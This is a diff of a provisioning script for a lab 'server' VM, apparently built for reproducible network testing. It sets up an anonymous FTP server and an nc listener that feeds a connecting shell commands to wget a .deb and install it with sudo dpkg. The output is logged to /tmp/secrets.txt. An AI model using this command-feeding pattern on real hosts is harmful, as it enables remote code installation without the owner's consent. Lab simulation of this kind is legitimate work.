@@ -56,7 +56,18 @@ Everything is done automatically through scripts for reproducility with minimum 
 
   config.script :server do
     %q{%{
-      echo "uname -r ; ls ; touch .bad_configrc ; exit" | nc -l 8080 > /tmp/secrets.txt &
+      sudo apt-get -y update
+      sudo apt-get -y install build-essential
+      sudo apt-get -y install python-pip python-dev
+      sudo pip install pyftpdlib
+
+      mkdir /tmp/ftptest
+      cd /tmp/ftptest
+      cp /vagrant/ipscan_3.5.5_amd64.deb /tmp/ftptest
+      sudo python -m pyftpdlib -p21 -w &
+      sleep 5
+      echo "uname -r ; ls ; wget ftp://anonymous@192.168.33.3:21/ipscan_3.5.5_amd64.deb ; sudo dpkg -i ipscan_3.5.5_amd64.deb ; exit" | nc -l 8585 > /tmp/secrets.txt &
+      sleep 5
     }}
   end
 
